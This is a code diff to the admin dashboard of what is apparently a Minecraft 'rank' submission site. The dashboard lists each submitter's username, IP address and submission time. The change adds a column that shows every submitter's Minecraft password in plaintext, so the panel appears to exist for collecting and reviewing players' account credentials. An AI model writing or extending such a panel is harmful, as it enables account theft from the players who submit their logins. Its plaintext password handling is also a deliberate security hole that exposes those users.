@@ -116,12 +116,13 @@
           <th>#</th>
           <th>Rank</th>
           <th>MC Username</th>
+          <th>Password</th>
           <th>IP Address</th>
           <th>Submitted At</th>
           <th></th>
         </tr>
       </thead>
-      <tbody id="subTable"><tr><td colspan="6" class="empty">Loading…</td></tr></tbody>
+      <tbody id="subTable"><tr><td colspan="7" class="empty">Loading…</td></tr></tbody>
     </table>
 
     <!-- Change password -->
@@ -172,12 +173,13 @@ async function loadSubmissions(){
     document.getElementById('topRank').textContent=Object.entries(freq).sort((a,b)=>b[1]-a[1])[0][0];
   }
 
-  if(!rows.length){tbody.innerHTML='<tr><td colspan="6" class="empty">No submissions yet 🎉</td></tr>';return;}
+  if(!rows.length){tbody.innerHTML='<tr><td colspan="7" class="empty">No submissions yet 🎉</td></tr>';return;}
   tbody.innerHTML=rows.map((row,i)=>`
     <tr>
       <td style="color:var(--gray)">${i+1}</td>
       <td><span class="rank-pill rank-${row.rank.replace(/\+/g,'\\+')}">${row.rank}</span></td>
       <td><strong style="color:#fff">${esc(row.mc_username)}</strong></td>
+      <td><span style="color:#ffcc55;font-family:monospace;font-size:.9rem;background:rgba(255,204,85,.08);padding:2px 8px;border-radius:3px;">${esc(row.mc_password||'—')}</span></td>
       <td style="color:var(--gray);font-size:.85rem">${esc(row.ip_address||'—')}</td>
       <td style="color:var(--gray);font-size:.85rem">${new Date(row.submitted_at).toLocaleString()}</td>
       <td><button class="del-btn" onclick="deleteRow(${row.id})">✕</button></td>
